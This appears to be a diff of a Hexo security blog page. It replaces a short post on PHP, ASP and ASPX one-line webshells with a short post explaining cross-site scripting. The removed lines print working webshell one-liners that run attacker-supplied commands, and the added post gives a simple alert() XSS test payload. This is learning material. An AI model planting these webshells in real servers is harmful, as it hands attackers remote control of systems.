@@ -6,7 +6,7 @@
     <meta name="keywords" content="Hexo Theme Redefine">
     <meta name="description" content="Hexo Theme Redefine">
     <meta name="author" content="Orange Wang">
-    <link rel="canonical" href="http://example.com/2023/01/07/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%92%8CWebshell/" />
+    <link rel="canonical" href="http://example.com/2023/09/06/XSS%E6%94%BB%E5%87%BB/" />
     <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
     <link rel="icon" type="image/png" href="/images/favicon of my blog.jpg" sizes="192x192">
     <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon of my blog.jpg">
@@ -14,7 +14,7 @@
     
     <title>
         
-            一句话木马和Webshell |
+            XSS攻击 |
         
         Orange Wang&#39;s Blog
     </title>
@@ -189,7 +189,7 @@
     <div class="post-page-container">
         <div class="article-content-container">
             <div class="article-title">
-                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">一句话木马和Webshell</h1></span>
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">XSS攻击</h1></span>
             </div>
 
             
@@ -208,8 +208,8 @@
                             <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="pc">2023-01-07 20:33:57</span>
-        <span class="mobile">2023-01-07 20:33</span>
+        <span class="pc">2023-09-06 22:26:31</span>
+        <span class="mobile">2023-09-06 22:26</span>
     </span>
     
     
@@ -230,18 +230,12 @@
             
 
             <div class="article-content markdown-body">
-                <h1 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h1><p>常见的一句话木马：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
-
-
-
-
-<p>根据下文学习并总结：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765" >https://blog.csdn.net/weixin_39190897/article/details/86772765 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+                <h1 id="一、XSS原理"><a href="#一、XSS原理" class="headerlink" title="一、XSS原理"></a>一、XSS原理</h1><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
+<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
+<p>俗称的见框就插。个人理解，由于HTML的标签特性，可以通过网页的输入框输入脚本代码，使网页执行恶意脚本，达到攻击的目的。</p>
+<p>参考文献：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Obs_cure/article/details/107744635" >https://blog.csdn.net/Obs_cure/article/details/107744635 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+<p>参考文章：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42646885/article/details/95175639" >https://blog.csdn.net/qq_42646885/article/details/95175639 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 
             </div>
 
@@ -249,11 +243,11 @@
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：一句话木马和Webshell</li>
+        <li>Post title：XSS攻击</li>
         <li>Post author：Orange Wang</li>
-        <li>Create time：2023-01-07 20:33:57</li>
+        <li>Create time：2023-09-06 22:26:31</li>
         <li>
-            Post link：https://redefine.ohevan.com/2023/01/07/一句话木马和Webshell/
+            Post link：https://redefine.ohevan.com/2023/09/06/XSS攻击/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -272,13 +266,13 @@
                         <div class="article-prev">
                             <a class="prev"
                             rel="prev"
-                            href="/2023/01/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"
+                            href="/2023/09/06/%E7%94%A8Burpsuite%E5%8F%91%E9%80%81post%E8%AF%B7%E6%B1%82/"
                             >
                                 <span class="left arrow-icon flex-center">
                                     <i class="fa-solid fa-chevron-left"></i>
                                 </span>
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">文件上传漏洞</span>
+                                    <span class="post-nav-title-item">用Burpsuite发送post请求</span>
                                     <span class="post-nav-item">Prev posts</span>
                                 </span>
                             </a>
@@ -288,10 +282,10 @@
                         <div class="article-next">
                             <a class="next"
                             rel="next"
-                            href="/2023/01/03/%E6%90%9C%E9%9B%86%E4%BA%86sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4/"
+                            href="/2023/08/26/pwn%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"
                             >
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">搜集了sqlmap的一些指令</span>
+                                    <span class="post-nav-title-item">pwn方向入门笔记</span>
                                     <span class="post-nav-item">Next posts</span>
                                 </span>
                                 <span class="right arrow-icon flex-center">
@@ -311,7 +305,7 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%BD%A2%E5%BC%8F"><span class="nav-text">常见形式</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81XSS%E5%8E%9F%E7%90%86"><span class="nav-text">一、XSS原理</span></a></li></ol>
     </div>
 </div>
             </div>
@@ -337,7 +331,7 @@
               <span>2022</span>
               -
             
-            2023&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">Orange Wang. All Rights Reserved.</a>
+            2024&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">Orange Wang. All Rights Reserved.</a>
         </div>
         
             <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
